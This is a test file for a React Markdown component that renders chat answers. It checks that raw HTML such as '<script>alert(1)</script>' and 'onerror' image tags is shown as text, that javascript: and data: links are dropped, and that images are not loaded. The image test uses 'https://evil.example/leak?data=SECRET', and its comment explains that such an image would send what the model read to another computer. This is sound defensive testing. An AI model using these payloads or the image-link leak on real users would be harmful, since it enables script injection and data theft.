import { act, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { Markdown, tableName, textOf } from "./Markdown";

const show = (text: string) => render(<Markdown text={text} />);

beforeEach(() => {
  Object.assign(navigator, { clipboard: { writeText: vi.fn().mockResolvedValue(undefined) } });
});
afterEach(() => vi.useRealTimers());

describe("Markdown", () => {
  it("draws the common forms: emphasis, lists, quotes, rules and inline code", () => {
    const { container } = show("Some **bold** and *italic* and `code`.\n\n- one\n- two\n\n1. first\n2. second\n\n> a quote\n\n---");
    expect(container.querySelector("strong")).toHaveTextContent("bold");
    expect(container.querySelector("em")).toHaveTextContent("italic");
    expect(container.querySelector("p code")).toHaveTextContent("code");
    expect(container.querySelectorAll("ul li")).toHaveLength(2);
    expect(container.querySelectorAll("ol li")).toHaveLength(2);
    expect(container.querySelector("blockquote")).toHaveTextContent("a quote");
    expect(container.querySelector("hr")).not.toBeNull();
  });

  it("draws GitHub's extras: a table in a scrolling frame, a strike-through and a task list", () => {
    const { container } = show("| a | b |\n|---|---|\n| 1 | 2 |\n\n~~gone~~\n\n- [x] done\n- [ ] todo");
    const table = container.querySelector("table")!;
    expect(table.querySelectorAll("th")).toHaveLength(2);
    expect(table.querySelectorAll("td")).toHaveLength(2);
    expect(table.parentElement).toHaveClass("overflow-x-auto");
    expect(screen.getByRole("table", { name: "Table: a, b" })).toBe(table);                           // a table of an answer is named by its column headings
    expect(container.querySelector("del")).toHaveTextContent("gone");
    expect(container.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });

  it("shows a code block with its language and highlights it", () => {
    const { container } = show("```python\ndef f(x):\n    return x + 1\n```");
    expect(screen.getByText("python")).toBeInTheDocument();
    expect(container.querySelector("pre code")).toHaveClass("language-python");
    expect(container.querySelector(".hljs-keyword")).toHaveTextContent("def");
    expect(container.querySelector("pre")!.textContent).toContain("return x + 1");
  });

  it("says text for a block with no language and does not highlight a language it does not know", () => {
    const { container } = show("```\nplain\n```\n\n```klingon\nqapla\n```");
    expect(screen.getAllByText("text")).toHaveLength(1);
    expect(screen.getByText("klingon")).toBeInTheDocument();
    expect(container.querySelectorAll("pre")).toHaveLength(2);
    expect(container.querySelector(".hljs-keyword")).toBeNull();
  });

  it("copies the code as it is written, without the highlighting, and says so for a moment", async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true });
    show("```js\nconst a = 'x';\nreturn a;\n```");
    fireEvent.click(screen.getByRole("button", { name: "Copy the code" }));
    await waitFor(() => expect(navigator.clipboard.writeText).toHaveBeenCalledWith("const a = 'x';\nreturn a;"));
    expect(await screen.findByRole("button", { name: "Copied" })).toBeInTheDocument();
    expect(screen.getByRole("status")).toHaveTextContent("Copied to the clipboard");
    await act(async () => { vi.advanceTimersByTime(2000); });
    expect(screen.getByRole("button", { name: "Copy the code" })).toBeInTheDocument();
  });

  it("does not say Copied when the clipboard refuses", async () => {
    vi.mocked(navigator.clipboard.writeText).mockRejectedValue(new Error("denied"));
    show("```js\nx\n```");
    fireEvent.click(screen.getByRole("button", { name: "Copy the code" }));
    await act(async () => { await Promise.resolve(); });
    expect(screen.queryByRole("button", { name: "Copied" })).toBeNull();
    expect(screen.getByRole("status")).toHaveTextContent("");
  });

  it("never renders raw HTML: it shows it as text", () => {
    const { container } = show("<script>alert(1)</script> and <b>not bold</b> and <img src=x onerror=alert(1)>");
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("<script>alert(1)</script>");
  });

  it("opens an http, https or mailto link outside the app and does not make a link of anything else", () => {
    const { container } = show("[web](https://example.org/a) [plain](http://example.org) [mail](mailto:a@example.org) [bad](javascript:alert(1)) [data](data:text/html,x) [rel](/api/x)");
    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://example.org/a", "http://example.org", "mailto:a@example.org"]);
    for (const a of links) {
      expect(a).toHaveAttribute("target", "_blank");
      expect(a).toHaveAttribute("rel", "noopener noreferrer");
    }
    expect(container.textContent).toContain("bad");
    expect(container.textContent).toContain("rel");
  });

  it("does not load an image: an address in an image would send what the model read to another computer", () => {
    const { container } = show("![a chart](https://evil.example/leak?data=SECRET) and ![](https://evil.example/x.png)");
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[image: a chart, not loaded]");
    expect(container.textContent).toContain("[image, not loaded]");
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("draws a heading as a bold line, never as a heading of the page", () => {
    const { container } = show("# One\n\n## Two\n\n###### Six\n\ntext");
    expect(container.querySelectorAll("h1, h2, h3, h4, h5, h6")).toHaveLength(0);
    expect(screen.getByText("One")).toHaveClass("font-semibold");
    expect(screen.getByText("Six")).toBeInTheDocument();
  });

  it("is re-drawn only when its text changes", () => {
    const { rerender, container } = show("hello");
    const first = container.querySelector(".chat-md");
    rerender(<Markdown text="hello" />);
    expect(container.querySelector(".chat-md")).toBe(first);
    rerender(<Markdown text="hello again" />);
    expect(container).toHaveTextContent("hello again");
  });

  it("copes with the text of an answer that is cut in the middle of a form", () => {
    const { container } = show("Here is **bold and a ```py\nx = 1");
    expect(container.textContent).toContain("bold");
    expect(() => show("| a | b\n|--")).not.toThrow();
  });
});

describe("textOf", () => {
  it("is the text of a node and nothing of the markup around it", () => {
    expect(textOf({ type: "element", children: [{ type: "text", value: "a" }, { type: "element", tagName: "span", children: [{ type: "text", value: "b" }] }, { type: "text", value: "c" }] })).toBe("abc");
    expect(textOf(undefined)).toBe("");
    expect(textOf({ type: "element" })).toBe("");
  });
});

describe("tableName", () => {
  it("is the column headings of the first row, and a plain name when there are none", () => {
    const cell = (tag: string, text: string) => ({ type: "element", tagName: tag, children: [{ type: "text", value: text }] });
    const table = (cells: unknown[]) => ({ type: "element", tagName: "table", children: [{ type: "element", tagName: "thead", children: [{ type: "element", tagName: "tr", children: cells }] }] });
    expect(tableName(table([cell("th", "file"), cell("th", " line ")]) as any)).toBe("Table: file, line");
    expect(tableName(table([cell("td", "x")]) as any)).toBe("Table: x");
    expect(tableName(table([cell("th", " ")]) as any)).toBe("A table in the answer");
    expect(tableName({ type: "element", tagName: "table", children: [] } as any)).toBe("A table in the answer");
    expect(tableName(undefined)).toBe("A table in the answer");
  });
});
